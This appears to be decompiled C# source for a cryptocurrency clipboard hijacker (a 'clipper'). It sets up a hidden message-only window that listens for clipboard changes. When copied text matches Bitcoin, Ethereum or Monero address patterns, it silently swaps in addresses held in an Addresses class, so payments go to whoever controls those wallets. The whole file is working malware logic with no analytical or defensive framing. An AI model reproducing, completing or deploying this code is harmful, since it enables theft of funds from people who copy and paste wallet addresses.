﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Crypto.Crypto
{
	public sealed class ClipboardNotification
	{
		[DebuggerNonUserCode]
		public ClipboardNotification()
		{
		}

		public class NotificationForm : Form
		{
			[DebuggerNonUserCode]
			private static void __ENCAddToList(object value)
			{
				List<WeakReference> _ENCList = ClipboardNotification.NotificationForm.__ENCList;
				checked
				{
					lock (_ENCList)
					{
						if (ClipboardNotification.NotificationForm.__ENCList.Count == ClipboardNotification.NotificationForm.__ENCList.Capacity)
						{
							int num = 0;
							int num2 = 0;
							int num3 = ClipboardNotification.NotificationForm.__ENCList.Count - 1;
							int num4 = num2;
							for (;;)
							{
								int num5 = num4;
								int num6 = num3;
								if (num5 > num6)
								{
									break;
								}
								WeakReference weakReference = ClipboardNotification.NotificationForm.__ENCList[num4];
								if (weakReference.IsAlive)
								{
									if (num4 != num)
									{
										ClipboardNotification.NotificationForm.__ENCList[num] = ClipboardNotification.NotificationForm.__ENCList[num4];
									}
									num++;
								}
								num4++;
							}
							ClipboardNotification.NotificationForm.__ENCList.RemoveRange(num, ClipboardNotification.NotificationForm.__ENCList.Count - num);
							ClipboardNotification.NotificationForm.__ENCList.Capacity = ClipboardNotification.NotificationForm.__ENCList.Count;
						}
						ClipboardNotification.NotificationForm.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
					}
				}
			}

			public NotificationForm()
			{
				ClipboardNotification.NotificationForm.__ENCAddToList(this);
				NativeMethods.SetParent(this.Handle, NativeMethods.HWND_MESSAGE);
				NativeMethods.AddClipboardFormatListener(this.Handle);
			}

			private bool RegexResult(Regex pattern)
			{
				return pattern.Match(ClipboardNotification.NotificationForm.currentClipboard).Success;
			}

			protected override void WndProc(ref Message m)
			{
				if (m.Msg == 797)
				{
					ClipboardNotification.NotificationForm.currentClipboard = Clipboard.GetText();
					if (Operators.CompareString(Addresses.btcE, "yes", false) == 0 && (this.RegexResult(PatternRegex.btc) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.btc)))
					{
						string text = PatternRegex.btc.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.btc);
						Clipboard.SetText(text);
					}
					if (Operators.CompareString(Addresses.ethereumE, "yes", false) == 0 && (this.RegexResult(PatternRegex.ethereum) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.ethereum)))
					{
						string text2 = PatternRegex.ethereum.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.ethereum);
						Clipboard.SetText(text2);
					}
					if (Operators.CompareString(Addresses.xmrE, "yes", false) == 0 && (this.RegexResult(PatternRegex.xmr) && !ClipboardNotification.NotificationForm.currentClipboard.Contains(Addresses.xmr)))
					{
						string text3 = PatternRegex.xmr.Replace(ClipboardNotification.NotificationForm.currentClipboard, Addresses.xmr);
						Clipboard.SetText(text3);
					}
				}
				base.WndProc(ref m);
			}

			private static List<WeakReference> __ENCList = new List<WeakReference>();

			private static string currentClipboard = Clipboard.GetText();
		}
	}
}
